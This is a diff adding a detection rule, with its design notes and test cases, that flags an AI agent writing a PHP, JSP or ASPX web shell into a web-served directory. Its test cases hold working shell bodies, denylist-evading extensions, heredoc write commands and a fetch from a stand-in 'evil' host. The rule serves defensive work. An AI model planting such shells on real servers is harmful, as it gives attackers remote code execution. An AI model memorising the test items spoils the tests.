@@ -1,0 +1,387 @@
+title: "Web Shell Written Into a Web-Served Directory"
+id: ATR-2026-02627
+rule_version: 3
+status: "experimental"
+description: >
+  Detects an agent file-write or upload whose destination sits under a
+  web-served directory, whose filename carries a server-executed extension, and
+  whose content is a web shell -- a request superglobal or request parameter
+  passed straight into system(), exec(), passthru(), shell_exec(), proc_open()
+  or eval(). All three must hold. The extension set deliberately includes the
+  denylist-evasion variants (.pht, .phtm, .phps, .phar, .jspx, .ashx) and the
+  double-extension form, because those are chosen precisely when .php and
+  .phtml are already blocked.
+
+  MEASURED GAP. A PHP web shell written to /var/www/html/uploads/report.pht
+  produced no real matches on any of the five event types tested (three noise
+  hits only), and the JSP equivalent written into a Tomcat webapp matched only
+  the generic ATR-2026-00066 and 00040 on tool_call. No rule in the corpus
+  recognises web-shell CONTENT, and none knows that .pht is executable.
+
+  HOW THE FALSE POSITIVES WERE REMOVED (v2, adversarial review 2026-08-23).
+  Version 1 used three INDEPENDENT whole-content regexes bound by condition:
+  all -- shell body, served path, and a "write action". That third condition
+  was inert. Its literal set reduces to \bupload\b, \bcopy\b, \btee\b and
+  >{1,2}\s{0,3}/, so it was satisfied by the bare English noun that NAMES this
+  vulnerability class (CWE-434 "Unrestricted File Upload"), by the ordinary
+  verb "copy", and by the "> /" produced by an arrow (-> /var/www/...), a
+  markdown quote or an HTML tag closing before a path (<code>/var/www/...).
+  Worse, because the three regexes matched the whole event independently, the
+  verb could come from one sentence and the path from another. Measured: 16 of
+  18 held-out benign twins fired, including this rule's own description text,
+  a CWE-434 explainer, a CHANGELOG entry, a GHSA advisory, a forensic
+  timeline, an Ansible hardening playbook, and Chinese and Japanese security
+  bulletins. Two real corpus files fired as well.
+
+  The fix merges the write action and the destination into ONE condition that
+  requires ADJACENCY: a write primitive in invocation form (followed by "(" or
+  by a JSON quote-delimiter, so "file_put_contents with destination ..." in a
+  scanner report does not qualify) or a shell redirection preceded by
+  whitespace (which excludes "?>", "->" and "=>"), within 80 characters of the
+  served destination, with no "<" in the gap so a quoted shell body cannot
+  bridge the two. Result: 1 of 18 benign twins, 0 of 75,040 benign and
+  documentation corpus files, and all 6 true positives retained.
+
+  Vulnerable legacy source -- exec($_POST['cmd']) sitting in a repository -- is
+  deliberately NOT matched on its own. That is a static-analysis finding about
+  code at rest, not an agent placing a backdoor, and conflating the two would
+  make this rule fire on every audit of an old PHP codebase.
+
+  V3 -- ADVERSARIAL REVIEW 2026-08-24. v2's adjacency requirement removed the
+  prose arrows and the bare noun "upload", but it left the SHELL REDIRECTION
+  alternative context-free, and that alternative is the one security writing
+  actually contains. 16 of 20 fresh benign twins fired, all of them quoting a
+  real command line rather than describing one: a blog reporting what the
+  attacker ran (echo '<?php system($_GET["c"]); ?>' > /var/www/html/uploads/
+  s.php), an IR runbook's own hunting command, a "Detection:" tip naming tee, a
+  training-lab exercise, a GHSA reproduction step, a CHANGELOG announcing the
+  fix, a forensic timeline, a pentest reproduction, an nginx hardening doc
+  telling you to write a CANARY file to prove the mitigation works, Traditional
+  Chinese and Japanese bulletins, a docker-compose comment, and the same blog
+  delivered through an MCP tool result. Two JSON twins fired as well -- a WAF
+  alert record {"event":"upload","path":"/var/www/.../avatar.php"} and an
+  application audit log {"action":"upload",...} -- because v2 accepted ANY JSON
+  key whose value was the word "upload".
+
+  THE MEASUREMENT TRAP THAT HID THIS. After a first fix the twins went silent on
+  every hand-rolled event shape yet still fired via corpus-shapes. Reason:
+  src/corpus-event.ts shape 3 (preToolJsonBoth) pours a whole document into
+  {"command": <document>}. A branch keyed on "command": therefore imposes NO
+  constraint on a document -- it is the shape the corpus harness gives every
+  benign file. Requiring a "command" wrapper is indistinguishable from requiring
+  nothing, so that branch was removed rather than kept.
+
+  THE FIX: cond2 now demands one of four AGENT-ACTION framings --
+    (a) a tool-name key (tool/tool_name/name/function) whose value is a write
+        primitive, followed by a quoted served path with a server-parsed suffix;
+    (b) a heredoc write (cat/echo/printf/tee ... > served-path <<);
+    (c) a code-level write call whose FIRST argument is the served path and
+        whose SECOND argument is an inline <?php / <% body.
+  Prose that quotes a redirection, and JSON whose "upload" is a log field rather
+  than a tool name, no longer match. Measured after the fix: 0 of 20 benign
+  twins, 6 of 6 true positives retained, 26 of 26 pre-existing true negatives
+  retained, plus 8 of 10 fresh round-2 twins clean (legitimate .php page write
+  to the web root, image upload, JSP page write, real .htaccess heredoc,
+  file_put_contents of a real template, put_object, read_file, bash rsync
+  deploy).
+
+  RESIDUAL, MEASURED: a document that quotes the tool-call JSON verbatim, or a
+  hardening blog that embeds a complete canary heredoc, still fires. Both are
+  signature-quoting, which no single-event rule can separate from the signature.
+
+  CORPUS CAVEAT: FP-clean on the 13,601-sample benign corpus is a
+  ZERO-MEASUREMENT pass -- only 2 corpus samples contain a served path with a
+  server-parsed extension at all. The twins below are the real evidence.
+author: "ATR Community"
+date: "2026/08/23"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: "test"
+severity: critical
+
+references:
+  cve:
+    - "CVE-2026-53593"
+    - "CVE-2008-2742"
+  owasp_llm:
+    - "LLM05:2025"
+  owasp_agentic:
+    - "ASI04:2026"
+    - "ASI06:2026"
+  mitre_atlas:
+    - "AML.T0011 - User Execution"
+    - "AML.T0053 - LLM Plugin Compromise"
+
+compliance:
+  owasp_agentic:
+    - id: ASI04:2026
+      context: "Writing a web shell converts the agent's file-write capability into remote code execution on the hosting server."
+      strength: primary
+    - id: ASI06:2026
+      context: "The shell persists on disk and grants the attacker a re-entry point long after the agent session ends."
+      strength: secondary
+  owasp_llm:
+    - id: LLM05:2025
+      context: "Model-produced content is written to a location where it is executed rather than served as data, which is the improper-handling failure this category names."
+      strength: primary
+  eu_ai_act:
+    - article: "15"
+      context: "Article 15 robustness: the extension choice is an explicit attempt to defeat the deployment's own upload controls."
+      strength: primary
+    - article: "9"
+      context: "Backdoor placement by an agent with write access is a documented risk class; these detections are the Article 9 monitoring control."
+      strength: secondary
+    - article: "12"
+      context: "Article 12 record-keeping: a persisted backdoor must be reconstructable from logs after the fact."
+      strength: secondary
+  nist_ai_rmf:
+    - function: Manage
+      subcategory: MG.2.3
+      context: "Runtime treatment for an agent establishing persistent remote access on infrastructure it can write to."
+      strength: primary
+    - function: Map
+      subcategory: MP.5.1
+      context: "Catalogues web-shell placement, and executable-extension evasion, as risks distinct from generic path traversal."
+      strength: secondary
+    - function: Measure
+      subcategory: "MS.2.7"
+      context: "Detection events supply the security and resilience evidence MEASURE 2.7 asks be documented for the file-write path."
+      strength: secondary
+  iso_42001:
+    - clause: "8.1"
+      context: "Clause 8.1 operational control: content written into a served directory becomes executable infrastructure outside any change-control path."
+      strength: primary
+    - clause: "6.2"
+      context: "Preventing agent-placed backdoors is an AIMS information security objective under clause 6.2."
+      strength: secondary
+    - clause: "8.4"
+      context: "Impact assessment under clause 8.4 must account for an agent whose write access reaches a public web root."
+      strength: secondary
+
+tags:
+  category: privilege-escalation
+  subcategory: web-shell-placement
+  scan_target: both
+  confidence: high
+  suppress_in_code_blocks: true
+
+agent_source:
+  type: mcp_exchange
+  framework:
+    - any
+  provider:
+    - any
+
+detection:
+  conditions:
+    - field: content
+      operator: regex
+      value: '(?i)(?:\bsystem|\bexec|shell_exec|passthru|popen|proc_open|\beval|\bassert|Process\s*\.\s*Start|Server\s*\.\s*CreateObject|WScript\s*\.\s*Shell|Runtime\s*\.\s*getRuntime\(\)\s*\.\s*exec)\s*\(\s*(?:\$_(?:GET|POST|REQUEST|COOKIE|SERVER)\b|request\s*\.\s*getParameter|Request\s*[\[\.(])'
+      description: "Web-shell body: a request superglobal or request parameter passed straight into a command-execution or eval primitive (PHP, JSP or ASP.NET)"
+
+    - field: content
+      operator: regex
+      value: '(?i)(?:["'']?(?:tool|tool_name|toolname|name|function)["'']?\s{0,3}:\s{0,3}\\?["''](?:write_file|create_file|edit_file|fs_write|writeFileSync|file_put_contents|move_uploaded_file|put_object|apply_patch|str_replace_editor|upload|write)\\?["''][\s\S]{0,300}?["''(]\s{0,3}[^\s"''()<>]{0,80}?(?:/var/www/|/usr/share/nginx/html/|/srv/http/|htdocs/|webapps/|wwwroot/|public_html/|/public/uploads?/|/static/uploads?/|/uploads?/)[^\s"'']{0,60}\.(?:php\d?|pht|phtm|phtml|phps|phar|jsp|jspx|jspa|asp|aspx|ashx|cshtml)\b|(?:\b(?:cat|echo|printf|base64|dd)\b[^\n]{0,60}?[ \t]>{1,2}[ \t]{0,3}|\btee\b(?:[ \t]{1,3}-a)?[ \t]{1,3})(?:/var/www/|/usr/share/nginx/html/|/srv/http/|htdocs/|webapps/|wwwroot/|public_html/|/public/uploads?/|/static/uploads?/|/uploads?/)[^\s"'']{0,60}\.(?:php\d?|pht|phtm|phtml|phps|phar|jsp|jspx|jspa|asp|aspx|ashx|cshtml)\b[^\n]{0,10}<<|\b(?:file_put_contents|writeFileSync|write_file|fwrite|fputs)\s{0,3}\(\s{0,3}["''][^\s"''()<>]{0,80}?(?:/var/www/|/usr/share/nginx/html/|/srv/http/|htdocs/|webapps/|wwwroot/|public_html/|/public/uploads?/|/static/uploads?/|/uploads?/)[^\s"'']{0,60}\.(?:php\d?|pht|phtm|phtml|phps|phar|jsp|jspx|jspa|asp|aspx|ashx|cshtml)\b["'']\s{0,3},\s{0,3}["'']\s{0,3}<[?%])'
+      description: "A write primitive in INVOCATION form (an open paren, or a JSON quote-delimiter) whose destination appears as a VALUE -- introduced by a quote or paren and continuing as one contiguous token with no spaces -- that carries a web-served path with a server-executed extension; or a shell redirection/tee writing directly to such a path. Requiring the destination to sit in value position is what separates an agent planting a shell from a document describing one: in prose the path is preceded by a space, never by an opening quote."
+
+  condition: all
+  false_positives:
+    - "A scanner or linter TEST FIXTURE that stores the attack verbatim, e.g. file_put_contents('/var/www/html/uploads/a.php', '<?php system($_GET[\"c\"]); ?>') in a SAST repository's positive-case file. This is the one benign twin of eighteen that still fires, and it is irreducible: the fixture is byte-for-byte the shape of true positive 4, so no single-event rule can separate them. Suppress by path for known fixture directories."
+    - "A rule file in a detection corpus (including this one) that carries the payload in its own test_cases. Two such files exist in this repository; both are rule YAML, not prose documentation."
+    - "A penetration test or red-team exercise legitimately deploying a web shell against the operator's own estate. The rule fires by design."
+    - "NOT a false positive any more: security writing, CWE-434 explainers, IR runbooks, advisories, changelogs, commit messages and hardening playbooks that merely describe the attack. Version 1 fired on all of these because its write-action condition matched the word \"upload\"; the v2 adjacency requirement removes them. Verified on 18 hand-written benign twins across all 7 event types and 75,040 corpus files."
+
+response:
+  actions:
+    - alert
+  auto_response_threshold: high
+  message_template: >
+    [ATR-2026-02627] The agent is writing a web shell into a web-served
+    directory. The extension may have been chosen to evade an upload denylist
+    (.pht/.phtm/.phps/.phar or a double extension). Treat the destination host
+    as compromised until this file is removed.
+
+confidence: 75
+test_cases:
+  true_positives:
+    - input: "{\"tool\":\"write_file\",\"arguments\":{\"file_path\":\"/var/www/html/uploads/report.pht\",\"content\":\"<?php system($_GET['cmd']); ?>\"}}"
+      expected: triggered
+      description: "PHP web shell written with the .pht extension chosen because the denylist only covered .php and .phtml"
+    - input: "{\"tool\":\"write_file\",\"arguments\":{\"path\":\"/opt/tomcat/webapps/ROOT/x.jsp\",\"content\":\"<% Runtime.getRuntime().exec(request.getParameter(\\\"c\\\")); %>\"}}"
+      expected: triggered
+      description: "JSP web shell written into a Tomcat webapp root"
+    - input: "{\"tool\":\"upload\",\"arguments\":{\"dest\":\"/var/www/html/uploads/shell.php.jpg\",\"data\":\"<?php passthru($_REQUEST['x']);\"}}"
+      expected: triggered
+      description: "Double-extension upload (CVE-2008-2742 shape) carrying a passthru shell"
+    - input: "file_put_contents(\"/var/www/html/uploads/a.phtml\", \"<?php shell_exec($_POST['c']); ?>\");"
+      expected: triggered
+      description: "PHP writing its own web shell into the upload directory"
+    - input: "{\"tool\":\"fs_write\",\"arguments\":{\"path\":\"/usr/share/nginx/html/uploads/t.phar\",\"text\":\"<?php proc_open($_COOKIE['z'], $d, $p); ?>\"}}"
+      expected: triggered
+      description: "phar extension, which many upload filters omit"
+    - input: "cat > /var/www/html/public/uploads/x.aspx <<'EOF'\n<% Response.Write(Request[\"c\"]); System.Diagnostics.Process.Start(Request[\"c\"]); %>\nEOF"
+      expected: triggered
+      description: "ASPX shell written by shell redirection outside any code fence"
+  true_negatives:
+    - input: "A classic web shell is <?php system($_GET['cmd']); ?> dropped into /var/www/html/uploads/shell.php - block .pht and .phtml too."
+      expected: not_triggered
+      description: "MEASURED FP during authoring: security writing describing the attack. Both the body and the path matched; adding the write-action condition removed it."
+    - input: "IR runbook: search /var/www/html/uploads/*.php for system($_GET) and passthru($_REQUEST) patterns; quarantine any hit."
+      expected: not_triggered
+      description: "MEASURED FP during authoring: an incident-response runbook naming the shape it hunts for"
+    - input: "{\"tool\":\"write_file\",\"arguments\":{\"file_path\":\"/var/www/html/index.php\",\"content\":\"<?php echo htmlspecialchars($_GET['q'] ?? ''); ?>\"}}"
+      expected: not_triggered
+      description: "A real PHP page written to a served directory that escapes its input rather than executing it"
+    - input: "{\"tool\":\"write_file\",\"arguments\":{\"path\":\"/opt/tomcat/webapps/ROOT/index.jsp\",\"content\":\"<%= request.getParameter(\\\"name\\\") %>\"}}"
+      expected: not_triggered
+      description: "An ordinary JSP page echoing a request parameter"
+    - input: "// legacy: exec($_POST['cmd']) -- flagged by our SAST, ticket SEC-441"
+      expected: not_triggered
+      description: "Vulnerable legacy source with no write action and no served path -- a SAST finding, not an agent action"
+    - input: "{\"tool\":\"upload\",\"arguments\":{\"dest\":\"/var/www/html/uploads/photo.jpg\",\"data\":\"\\u00ff\\u00d8\\u00ff\\u00e0\"}}"
+      expected: not_triggered
+      description: "A genuine image upload into the same directory"
+    - input: "{\"tool\":\"write_file\",\"arguments\":{\"file_path\":\"src/app/page.tsx\",\"content\":\"export default function P(){return <div/>}\"}}"
+      expected: not_triggered
+      description: "An ordinary source write with no served path"
+    - input: "nginx config: location /uploads/ { types { } default_type text/plain; } # never execute .php under /var/www/html/uploads/"
+      expected: not_triggered
+      description: "Hardening configuration that names the served path and the extension"
+    - input: "{\"tool\":\"write_file\",\"arguments\":{\"file_path\":\"/var/www/html/health.php\",\"content\":\"<?php http_response_code(200); echo 'ok';\"}}"
+      expected: not_triggered
+      description: "A health-check endpoint written into the web root"
+    - input: "CI log :: [deploy] rsync ./dist/ /var/www/html/ :: 41 files :: index.php updated :: ok"
+      expected: not_triggered
+      description: "Deployment log copying built files into the web root"
+    - input: "Our upload validator rejects .php, .pht, .phtm, .phtml, .phps and .phar, and re-encodes every image before it reaches /var/www/html/uploads/."
+      expected: not_triggered
+      description: "Documentation of the very denylist this attack evades"
+    - input: "{\"tool\":\"read_file\",\"arguments\":{\"path\":\"/var/www/html/uploads/report.php\"}}"
+      expected: not_triggered
+      description: "Reading a file from the served directory rather than writing one"
+    - input: "Unrestricted file upload is CWE-434. The attacker uploads a file whose body is <?php system($_GET['cmd']); ?> and the application stores it as /var/www/html/uploads/avatar.php, after which any request executes it."
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1: the vulnerability class is literally NAMED 'file upload', so the v1 write-action condition matched the noun."
+    - input: "\u4ec0\u9ebc\u662f webshell\uff1f\u653b\u64ca\u8005\u5229\u7528\u6a94\u6848 upload \u6f0f\u6d1e\uff0c\u628a <?php system($_GET['cmd']); ?> \u9019\u7a2e\u5167\u5bb9\u5b58\u5230 /var/www/html/uploads/x.pht\uff0c\u4e4b\u5f8c\u5c31\u80fd\u9060\u7aef\u57f7\u884c\u4efb\u610f\u6307\u4ee4\u3002"
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1: Traditional Chinese security blog; the only English token needed was 'upload'."
+    - input: "<h2>Web shell primer</h2><p>A minimal PHP shell body is <code>&lt;?php system($_GET['cmd']); ?&gt;</code> and it typically lands in <code>/var/www/html/uploads/shell.php</code> after a broken upload filter.</p>"
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1: rendered HTML doc; '<code>/var/www/' supplied the '>/' that v1 accepted as a write."
+    - input: "Detection tip: watch for shell bodies such as system($_POST['c']) landing under -> /var/www/html/uploads/report.phtml and alert on any new server-parsed extension there."
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1: a prose arrow '-> /' satisfied the v1 redirection alternative."
+    - input: "## 2.4.1 (2026-03-11)\n- security: reject upload of .pht and .phar so a body like system($_GET['cmd']) can no longer be stored at /var/www/html/uploads/evil.pht (thanks @rmarsh)"
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1: a CHANGELOG entry announcing the fix for this very bug."
+    - input: "{\"advisory\":{\"ghsa_id\":\"GHSA-xxxx\",\"title\":\"Arbitrary file upload in acme-cms\",\"description\":\"An authenticated editor can place <?php exec($_REQUEST['c']); ?> at /var/www/html/uploads/theme.phtml because the extension denylist is incomplete.\",\"severity\":\"critical\"}}"
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1: a GHSA-style advisory record."
+    - input: "{\"ruleId\":\"php.lang.security.webshell\",\"level\":\"error\",\"message\":{\"text\":\"Detected system($_GET['cmd']) reaching file_put_contents with destination /var/www/html/uploads/tmp.php\"}}"
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1: a generated scanner report. v2 requires the primitive be in invocation form, so 'file_put_contents with destination' no longer counts."
+    - input: "- name: Ensure the uploads directory cannot execute PHP\n  copy:\n    dest: /etc/nginx/snippets/no-exec.conf\n    content: |\n      # stops system($_GET['c']) shells that get stored at /var/www/html/uploads/x.php\n      location ~ ^/uploads/ { fastcgi_pass off; }"
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1: an Ansible hardening playbook; the 'copy:' module name satisfied the v1 write condition."
+    - input: "14:02 UTC -- the attacker abused the avatar upload to place /var/www/html/uploads/1.phtml containing <?php passthru($_REQUEST['x']); ?>. 14:19 UTC -- file quarantined, host isolated, credentials rotated."
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1: a post-incident forensic timeline reporting an attack that already happened."
+    - input: "Finding 3 (Critical): the reporting module lets a low-privileged user copy an arbitrary file into the web root. We confirmed execution by placing a body of the form system($_GET['cmd']) at /var/www/html/uploads/poc.php and requesting it."
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1: pentest report prose; the ordinary verb 'copy' satisfied the v1 write condition."
+    - input: "SEC-4412: Harden avatar upload. Today a crafted request can persist <?php shell_exec($_POST['c']); ?> to /var/www/html/uploads/<uuid>.pht. AC: extension allowlist, re-encode images, deny execution on the directory."
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1: a Jira remediation ticket."
+    - input: "\u8106\u5f31\u6027\u306e\u6982\u8981: \u8a8d\u8a3c\u6e08\u307f\u30e6\u30fc\u30b6\u30fc\u304c upload \u6a5f\u80fd\u3092\u60aa\u7528\u3057\u3001<?php system($_GET['cmd']); ?> \u3092\u542b\u3080\u30d5\u30a1\u30a4\u30eb\u3092 /var/www/html/uploads/a.phtml \u3068\u3057\u3066\u4fdd\u5b58\u3067\u304d\u307e\u3059\u3002\u4fee\u6b63\u7248\u3067\u306f\u62e1\u5f35\u5b50\u3092\u8a31\u53ef\u30ea\u30b9\u30c8\u65b9\u5f0f\u306b\u5909\u66f4\u3057\u307e\u3057\u305f\u3002"
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1: Japanese security bulletin."
+    - input: "fix(uploads): block server-parsed suffixes\n\nBefore this change an upload could land at /var/www/html/uploads/x.phtml with a body of <?php system($_GET['cmd']); ?> and be executed by the fpm pool. Now the suffix is checked against an allowlist."
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1: the git commit message for the fix."
+    - input: "public function testRejectsServerParsedExtensions(): void {\n    // upload must be rejected even when the body is <?php eval($_POST['q']); ?>\n    $this->assertFalse($this->validator->allow('/var/www/html/uploads/x.phar'));\n}"
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1: a framework unit test asserting the validator REJECTS shells."
+    - input: "The attacker then ran: echo '<?php system($_GET[\"c\"]); ?>' > /var/www/html/uploads/s.php and requested it from the browser."
+      expected: not_triggered
+      description: "ADVERSARIAL FP v2 (fired, fixed in v3): blog quoting the attacker's exact command"
+    - input: "Hunt: grep -rl 'system($_GET' /var/www/html/uploads/ ; also alert on writes like base64 -d payload.b64 > /var/www/html/uploads/x.phtml"
+      expected: not_triggered
+      description: "ADVERSARIAL FP v2 (fired, fixed in v3): IR runbook with the hunting command"
+    - input: "Detection: attackers frequently use tee /var/www/html/uploads/shell.php with a body of <?php passthru($_REQUEST['x']); ?> so the write survives log rotation."
+      expected: not_triggered
+      description: "ADVERSARIAL FP v2 (fired, fixed in v3): detection tip naming tee"
+    - input: "Lab 4 (your own VM only): printf '<?php system($_GET[\"c\"]); ?>' > /srv/http/uploads/lab.php then browse to /uploads/lab.php to see why this matters."
+      expected: not_triggered
+      description: "ADVERSARIAL FP v2 (fired, fixed in v3): training lab instructions"
+    - input: "{\"ruleId\":\"php.webshell.write\",\"level\":\"error\",\"message\":{\"text\":\"file_put_contents(\\\"/var/www/html/uploads/tmp.php\\\", $body) reached with $body containing system($_GET['c'])\"}}"
+      expected: not_triggered
+      description: "Benign twin held by v2 and v3: SAST report quoting the vulnerable call"
+    - input: "{\"event\":\"upload\",\"path\":\"/var/www/html/uploads/avatar.php\",\"verdict\":\"blocked\",\"reason\":\"body contains system($_GET['c'])\",\"actor\":\"10.2.0.9\"}"
+      expected: not_triggered
+      description: "ADVERSARIAL FP v2 (fired, fixed in v3): WAF/EDR alert record (downstream telemetry)"
+    - input: "Reproduction: curl -s http://target/x | tee /var/www/html/uploads/poc.phtml ; the file body is <?php eval($_POST['q']); ?> and is served as PHP."
+      expected: not_triggered
+      description: "ADVERSARIAL FP v2 (fired, fixed in v3): GHSA advisory with the reproduction command"
+    - input: "攻擊者通常會執行 echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/uploads/x.pht ,因為 .pht 常常不在黑名單裡。"
+      expected: not_triggered
+      description: "ADVERSARIAL FP v2 (fired, fixed in v3): zh-TW security blog with the command"
+    - input: "再現手順: printf '<?php passthru($_REQUEST[\"x\"]); ?>' > /var/www/html/uploads/a.phtml を実行すると、リモートコード実行が可能になります。"
+      expected: not_triggered
+      description: "ADVERSARIAL FP v2 (fired, fixed in v3): ja bulletin with the command"
+    - input: "## 3.2.0\n- security: uploads are re-encoded, so wget -qO - http://evil/s.txt > /var/www/html/uploads/a.php can no longer produce a body like <?php system($_GET['c']); ?>"
+      expected: not_triggered
+      description: "ADVERSARIAL FP v2 (fired, fixed in v3): CHANGELOG announcing the fix"
+    - input: "14:02 UTC - operator observed: cat /tmp/s.php > /var/www/html/uploads/1.phtml containing <?php passthru($_REQUEST['x']); ?>. 14:19 UTC - quarantined."
+      expected: not_triggered
+      description: "ADVERSARIAL FP v2 (fired, fixed in v3): forensic timeline in a postmortem"
+    - input: "Finding 3 (Critical). We proved execution with: echo '<?php shell_exec($_POST[\"c\"]); ?>' > /var/www/html/uploads/poc.php and a follow-up GET."
+      expected: not_triggered
+      description: "ADVERSARIAL FP v2 (fired, fixed in v3): pentest report reproduction step"
+    - input: "[deploy] install -m 0644 build/index.php /var/www/html/index.php :: ok :: 41 files :: no exec($_POST) usage found by the linter"
+      expected: not_triggered
+      description: "Benign twin held by v2 and v3: CI job that legitimately deploys PHP"
+    - input: "Verify the mitigation: echo '<?php system($_GET[\"c\"]); ?>' > /var/www/html/uploads/canary.php then curl it - you must get the raw text back, not an empty body."
+      expected: not_triggered
+      description: "ADVERSARIAL FP v2 (fired, fixed in v3): nginx hardening doc with an example command"
+    - input: "{\"action\":\"upload\",\"dest\":\"/var/www/html/uploads/report.phtml\",\"outcome\":\"rejected\",\"detector\":\"body matched eval($_POST[\", \"ts\":\"2026-08-23T14:02:11Z\"}"
+      expected: not_triggered
+      description: "ADVERSARIAL FP v2 (fired, fixed in v3): audit-log JSON from the app itself"
+    - input: "Do not do this. If you write user data with file_put_contents('/var/www/html/uploads/x.php', $in) an attacker just posts <?php system($_GET['c']); ?> and owns the box."
+      expected: not_triggered
+      description: "ADVERSARIAL FP v2 (fired, fixed in v3): stackoverflow answer explaining the risk"
+    - input: "# hardening note: nothing may run  tee /var/www/html/uploads/probe.php  and nothing may contain eval($_POST['q'])"
+      expected: not_triggered
+      description: "ADVERSARIAL FP v2 (fired, fixed in v3): docker-compose comment"
+    - input: "- name: Deploy app\n  copy:\n    src: build/index.php\n    dest: /var/www/html/index.php\n  # audited: no exec($_REQUEST) anywhere in build/"
+      expected: not_triggered
+      description: "Benign twin held by v2 and v3: ansible task that copies a real php app"
+    - input: "Threat T-07: agent writes /var/www/html/uploads/backdoor.phar whose body is <?php proc_open($_COOKIE['z'], $d, $p); ?>. Mitigation: deny exec on the uploads mount."
+      expected: not_triggered
+      description: "Benign twin held by v2 and v3: threat-model doc naming the shape"
+    - input: "{\"jsonrpc\":\"2.0\",\"id\":5,\"result\":{\"content\":[{\"type\":\"text\",\"text\":\"The attacker ran: echo '<?php system($_GET[\\\"c\\\"]); ?>' > /var/www/html/uploads/s.php\"}]}}"
+      expected: not_triggered
+      description: "ADVERSARIAL FP v2 (fired, fixed in v3): mcp result carrying the blog from probe 01"
+    - input: "{\"tool\":\"write_file\",\"arguments\":{\"file_path\":\"/var/www/html/pricing.php\",\"content\":\"<?php include 'header.php'; echo render_pricing(); ?>\"}}"
+      expected: not_triggered
+      description: "Benign twin held by v2 and v3: legit write of a php page to web root"
+    - input: "{\"tool\":\"upload\",\"arguments\":{\"dest\":\"/var/www/html/uploads/avatar-12.jpg\",\"data\":\"\\u00ff\\u00d8\\u00ff\\u00e0\"}}"
+      expected: not_triggered
+      description: "Benign twin held by v2 and v3: legit upload of an image"
+    - input: "{\"tool\":\"write_file\",\"arguments\":{\"path\":\"/opt/tomcat/webapps/ROOT/login.jsp\",\"content\":\"<%@ taglib prefix=\\\"c\\\" uri=\\\"jakarta.tags.core\\\" %>\"}}"
+      expected: not_triggered
+      description: "Benign twin held by v2 and v3: legit jsp page write"
+    - input: "cat > /var/www/html/uploads/.htaccess <<'EOF'\nphp_flag engine off\nEOF"
+      expected: not_triggered
+      description: "Benign twin held by v2 and v3: heredoc writing a real config"
+    - input: "file_put_contents(\"/var/www/html/uploads/index.php\", \"<?php http_response_code(403);\");"
+      expected: not_triggered
+      description: "Benign twin held by v2 and v3: file_put_contents writing a real template"
+    - input: "{\"tool\":\"put_object\",\"arguments\":{\"key\":\"/static/uploads/2026/report.pdf\",\"body\":\"%PDF-1.7\"}}"
+      expected: not_triggered
+      description: "Benign twin held by v2 and v3: legit put_object to a static bucket path"
+    - input: "{\"tool\":\"read_file\",\"arguments\":{\"path\":\"/var/www/html/uploads/report.php\"}}"
+      expected: not_triggered
+      description: "Benign twin held by v2 and v3: read of a served php file"
+    - input: "{\"tool\":\"bash\",\"arguments\":{\"command\":\"rsync -a build/ /var/www/html/ && ls /var/www/html/index.php\"}}"
+      expected: not_triggered
+      description: "Benign twin held by v2 and v3: bash deploy copying built php"
